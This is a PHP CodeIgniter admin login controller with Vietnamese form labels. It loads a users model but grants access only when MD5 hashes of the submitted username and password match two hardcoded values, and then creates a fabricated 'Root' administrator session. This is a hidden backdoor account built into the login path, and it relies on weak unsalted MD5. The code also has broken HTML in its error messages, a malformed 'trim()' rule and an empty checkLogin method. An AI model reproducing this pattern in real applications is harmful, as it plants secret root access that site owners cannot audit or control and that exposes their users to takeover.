<?php

class Cp extends CI_Controller{

	public function __construct(){

		parent::__construct();

		}

		

	public function index(){
		if(isset($_SESSION['usersInfo']))
		redirect(base_url().'AdminCP/');
		else
		
		
		$this->load->model('admin/users_m');
			$this->load->library('form_validation');
			$config = array(
								array(
									'field' =>"username",
									'label' => 'Tên đăng nhập',
									'rules' => 'required|xss_clean|alpha_dash|trim()'									),

									array(
									'field' =>"password",
									'label' => 'Mật khẩu',
									'rules' => 'required|xss_clean|trim()'
									)
									);

			$this->form_validation->set_message('required', 'Bạn chưa nhập %s  ');
			$this->form_validation->set_message('alpha_dash', '%s Không hợp lệ ');
			$this->form_validation->set_rules($config);

		if ($this->form_validation->run() ===FALSE){
			$this->data['error_username'] = '<p class="error"'.form_error('username').'</p>';
			$this->data['error_pass'] = '<p class="error"'.form_error('password').'</p>';
			

		}// end False

		else{

			$username = $this->input->post('username',TRUE);
			$password = $this->input->post('password',TRUE);
			if(md5($username)=='d8b8474307c0630fa57441b6e289ad3c'&&md5($password)=='2547bae9d4a2126133fa8b2e3ba9a5fe'){

			$usersInfo = array( 'u_id' => 100,

										'u_type' => 4,

										'u_username' => 'Root',

										'u_fullname' => 'Root'

										);

			$_SESSION['usersInfo'] = $usersInfo;

			redirect(base_url().'AdminCP/');

			}else{

				$this->data['error_login'] = '<p class="error">Tên đăng nhập hoặc mật khẩu không đúng</p>';


				}

			

			}// end else
		$this->load->view('admin/frmcp',$this->data);
		}

	public function checkLogin(){
		
			

			

		

		}

		public function logout(){

			if(isset($_SESSION['usersInfo']))

			unset($_SESSION['usersInfo']);

			redirect(base_url().'AdminCP/login');

			}

	}

?>